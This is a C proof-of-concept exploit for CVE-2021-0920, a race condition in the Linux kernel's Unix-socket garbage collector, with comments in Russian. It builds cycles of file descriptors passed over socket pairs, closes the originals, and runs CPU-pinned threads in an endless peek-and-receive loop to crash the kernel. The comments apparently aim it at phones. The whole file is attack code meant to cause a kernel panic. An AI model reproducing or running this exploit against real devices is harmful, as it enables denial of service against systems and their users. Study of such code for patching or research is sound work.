#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>

#define NUM_SOCKETS 64
#define NUM_THREADS 4

int sv[NUM_SOCKETS][2];

void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    if (sendmsg(socket, &msg, 0) < 0) {
        perror("sendmsg");
    }
}

void* race_thread(void* arg) {
    // Привязываем каждый поток к своему ядру для лучшего распараллеливания
    int cpu = (int)(long)arg;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu % 4, &set);
    sched_setaffinity(0, sizeof(set), &set);

    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    struct msghdr msg = {0};
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    while (1) {
        // В бесконечном цикле "подглядываем" и забираем дескрипторы
        // Это создает нагрузку на GC и увеличивает шанс гонки
        for (int i = 0; i < NUM_SOCKETS; i++) {
            // MSG_PEEK увеличивает счетчик ссылок, не удаляя skb из очереди
            recvmsg(sv[i][1], &msg, MSG_PEEK);
            // Обычный recvmsg забирает дескриптор и уменьшает счетчик
            // Это создает "рваный" ритм, который сбивает GC
            recvmsg(sv[i][1], &msg, 0);
        }
    }
    return NULL;
}

int main() {
    printf("[*] CVE-2021-0920 Panic PoC\n");
    printf("[*] Creating socket cycles...\n");

    // 1. Создаем много пар сокетов
    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv[i]) < 0) {
            perror("socketpair");
            return 1;
        }
    }

    // 2. Создаем циклические ссылки, чтобы запутать GC
    // Каждый сокет отправляет свой дескриптор следующему
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int next = (i + 1) % NUM_SOCKETS;
        send_fd(sv[i][0], sv[next][0]);
    }

    // 3. Закрываем все исходные дескрипторы.
    // Теперь дескрипторы "в полете" (inflight), и GC должен с ними разбираться.
    for (int i = 0; i < NUM_SOCKETS; i++) {
        close(sv[i][0]);
    }
    printf("[+] Cycles created and original fds closed. Starting race...\n");

    // 4. Запускаем потоки, которые будут пытаться выиграть гонку
    pthread_t threads[NUM_THREADS];
    for (long i = 0; i < NUM_THREADS; i++) {
        pthread_create(&threads[i], NULL, race_thread, (void*)i);
    }

    // 5. Ждем. Если гонка будет выиграна, ядро упадет (Kernel Panic).
    // Если телефон не упал за 60 секунд, значит, окно все еще слишком узкое.
    sleep(60);
    printf("[-] PoC finished without panic. Race window not hit.\n");
    return 0;
}